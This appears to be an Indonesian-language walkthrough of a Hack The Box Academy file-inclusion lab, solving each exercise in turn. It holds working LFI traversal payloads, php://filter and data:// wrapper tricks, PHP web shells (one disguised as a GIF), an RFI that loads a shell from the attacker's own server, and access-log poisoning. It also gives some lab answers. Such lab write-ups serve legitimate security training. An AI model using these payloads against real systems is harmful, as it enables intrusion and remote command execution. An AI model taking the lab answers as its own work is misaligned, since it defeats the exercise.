# File Inclusion
- Link modul: https://academy.hackthebox.com/module/details/23

## Local File Inclusion (LFI)
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%202.JPG)

- **Question:** Using the file inclusion find the name of a user on the system that starts with "b".
- Vunerability berada di URL `http://ip:port/index.php?language=en.php`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%203.JPG)

- Selanjutnya kita ganti nilai parameter `language` dengan payload file inclusion untuk membaca file `/etc/passwd`
- Akses URL berikut di browser
```sh
http://ip:port/index.php?language=../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%204.JPG)

- Ditemukan nama user barry pada file `/etc/passwd`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%205.JPG)

- **Answer**
```sh
barry
```

- **Question:** Submit the contents of the flag.txt file located in the /usr/share/flags directory.
- Akses URL berikut di browser
```sh
http://ip:port/index.php?language=../../../../usr/share/flags/flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%206.JPG)

- **Answer**
```sh
HTB{***}
```

## Basic Bypasses
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%207.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%208.JPG)

- **Question:** The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
- Akses URL berikut di browser untuk mengecek vulnerability file inclusion pada web target
```sh
http://ip:port/index.php?language=languages//....//....//....//....//etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%209.JPG)

- Akses URL berikut di browser untuk membaca flag
```sh
http://ip:port/index.php?language=languages//....//....//....//....//flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2010.JPG)

- **Answer**
```sh
HTB{***}
```

## PHP Filters
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2011.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2012.JPG)

- **Question:**  Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
- Pada task ini kita akan menggunakan wordlists dari seclists. Wordlists ini secara default belum tersedia di kali linux, jadi anda perlu menginstalasi terlebih dahulu dengan perintah sebagai berikut
```sh
sudo apt install seclists
```
- Jalankan tool `ffuf` untuk menemukan halaman yang mengandung script PHP
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.59.180:45986/FUZZ -e .php -c -ic
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2013.JPG)

- Ditemukan script `configure.php` pada hasil fuzzing diatas

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2014.JPG)

- Akses URL sebagai berikut pada browser untuk membuka isi file tersebut
```sh
http://ip:port/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2015.JPG)

- Terdapat code base64 pada halaman diatas, tekan `Ctrl+U` agar kita bisa mengcopy code base64 tersebut secara full

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2016.JPG)

- Decode code base64 diatas lewat terminal
```sh
echo 'code base64' | base64 -d
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2017.JPG)

- **Answer**
```sh
HTB{***}
```

## PHP Wrappers
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2018.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2019.JPG)

- **Question:** Try to gain RCE using one of the PHP wrappers and read the flag at /
- Buka URL berikut ini, untuk membuka isi file `php.ini`
```sh
http://ip:port/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2020.JPG)

- Tekan `Ctrl+U` untuk membuka kode sumber halaman lalu copy seluruh isi code base64

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2021.JPG)

- Tempel pada mousepad dan simpan dengan nama file `php-ini`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2022.JPG)

- Decode melalui terminal dan cari konfigurasi `allow_url_include`
```sh
cat php-ini | base64 -d | grep 'allow_url_include'
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2023.JPG)

- Karena `allow_url_include = On` sekarang kita bisa buat RCE. Decode source code RCE PHP menggunakan base64
```sh
echo '<?php system($_GET["cmd"]); ?>' | base64
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2024.JPG)

- Copy base64 diatas lalu encode ke URL di https://www.urlencoder.org/

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2025.JPG)

- Masukkan hasil encode diatas ke dalam URL jalankan melalui web target
```sh
http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2026.JPG)

- Jika kita masukkan nilai parameter `cmd=ls /` maka disana terdapat file txt yang kemungkinan berisi flag

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2027.JPG)

- Sekarang coba buka isi file tersebut menggunakan perintah `cat /nama_file` melalui URL
```sh
http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/nama_file
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2028.JPG)

- **Answer**
```sh
HTB{***}
```

## Remote File Inclusion (RFI)
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2029.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2030.JPG)

- **Question:**  Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
- Buat sebuah file `shell.php` dengan perintah sebagai berikut
```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2031.JPG)

- Serving menggunkan python3
```sh
sudo python3 -m http.server 80
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2032.JPG)

- Akses URL berikut ini di browser
```sh
http://ip/index.php?language=http://ip_tun0/shell.php&cmd=id
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2033.JPG)

- Jika kita masukkan perintah `ls /` pada parameter cmd akan tampil nama folder `exercise`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2034.JPG)

- Didalam folder `exercise` ternyata terdapat file `flag.txt`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2035.JPG)

- Baca isi file tersebut dengan URL dibawah ini
```sh
http://ip/index.php?language=http://ip_tun0/shell.php&cmd=cat%20/exercise/flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2036.JPG)

- **Answer**
```sh
masukkan hash
```

## LFI and File Uploads
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2037.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2038.JPG)

- **Question:** Use any of the techniques covered in this section to gain RCE and read the flag at /
- Buat file gambar yang berisi web shell
```sh
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2039.JPG)

- Akses URL `http://ip:port/settings.php` di browser untuk mengunggah file gambar `shell.gif` yang sudah dibuat

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2040.JPG)

- Klik foto profil untuk memilih foto profil dan tekan tombol **Upload** untuk mengunggah file

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2041.JPG)

- Setelah file gambar berhasil diunggah tekan `Ctrl+U` untuk membuka source code halaman. Di sini dapat dilihat bahwa foto profil disimpan di direktori `/profile_images`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2042.JPG)

- Akses URL sebagai berikut untuk menguji coba RCE
```sh
http://ip:port/index.php?language=./profile_images/shell.gif&cmd=id
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2043.JPG)

- Jika kita masukkan perintah `ls /` pada parameter cmd akan ditemukan nama file yang kemungkinan berisi sebuah flag

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2044.JPG)

- Sekarang coba buka isi file tersebut menggunakan perintah `cat /nama_file` melalui URL
```sh
http://ip:port/index.php?language=./profile_images/shell.gif&cmd=cat%20/nama_file
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2045.JPG)

- **Answer**
```sh
HTB{***}
```

## Log Poisoning
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2046.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2047.JPG)

- **Question:** Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
- Akses URL sebagai berikut
```sh
http://ip:port/index.php?language=/var/log/apache2/access.log
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2048.JPG)

- Jalankan tool Burp Suite untuk merekam request pada URL diatas

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2049.JPG)

- Setelah request berhasil terekam, klik kanan request tersebut dan pilih **Send to Repeater**

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2050.JPG)

- Pindah ke tab Repeater

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2051.JPG)

- Ubah nilai `User-Agent` menjadi `Poison` lalu klik tombol **Send**. Anda mungkin perlu menekan tombol **Send** dua kali untuk hasil yang sesuai

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2052.JPG)

- Disini kita bisa menginjekkan script RCE pada User-Agent. Ubah nilai `User-Agent` menjadi script RCE dan tambahkan parameter `&cmd=pwd` pada URL lalu klik tombol **Send**
```sh
<?php system($_GET['cmd']); ?>
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2053.JPG)

- Dari hasil dapat dilihat kita berada di direktori `/var/www/html`
```sh
/var/www/html
```
- **Answer**
```sh
/var/www/html
```
- **Question:** Try to use a different technique to gain RCE and read the flag at /
- Ubah nilai parameter `cmd` dari `pwd` menjadi `ls%20/` untuk melihat file dan direktori apa saja di direktori `/`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2054.JPG)

- Disini kita menemukan file txt yang kemungkinan berisi sebuah flag. Sekarang coba buka isi file tersebut menggunakan perintah cat /nama_file
```sh
GET /index.php?language=/var/log/apache2/access.log&cmd=cat%20/nama_file.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2055.JPG)

- **Answer**
```sh
HTB{***}
```

## Automated Scanning
- Jalankan web target terlebih dahulu

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2056.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2057.JPG)

- **Question:** Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
- Pada section ini kita akan menggunakan wordlists dari seclists. Wordlists ini secara default belum tersedia di kali linux, jadi anda perlu menginstalasi terlebih dahulu dengan perintah sebagai berikut
```sh
sudo apt install seclists
```
- Jalankan tool `ffuf` untuk mengetahui nama parameter yang digunakan di halaman `index.php`. Pada percobaan pertama ditemukan banyak hasil dengan ukuran halaman 2309 sehingga kita filter untuk halaman yang berukuran 2309
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://ip:port/index.php?FUZZ=value -c -ic -fs 2309
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2058.JPG)

- Dari hasil percobaan diatas ditemukan nama parameter `view`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2059.JPG)

- Selanjutnya kita gunakan tool `ffuf` lagi untuk menginjekkan payload LFI pada parameter tersebut. Pada percobaan pertama ditemukan banyak hasil dengan ukuran halaman 1935 sehingga kita filter untuk halaman yang berukuran 1935
```sh
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://ip:port/index.php?view=FUZZ -c -ic -fs 1935 -v
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2060.JPG)

- Ditemukan hasil sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2061.JPG)

- Sekarang kita coba akses URL di browser
```sh
http://ip:port/index.php?view=../../../../../../../../../../../../../../../../../../../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2062.JPG)

- Sekarang kita akses `/flag.txt`

![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2063.JPG)

- **Answer**
```sh
HTB{***}
```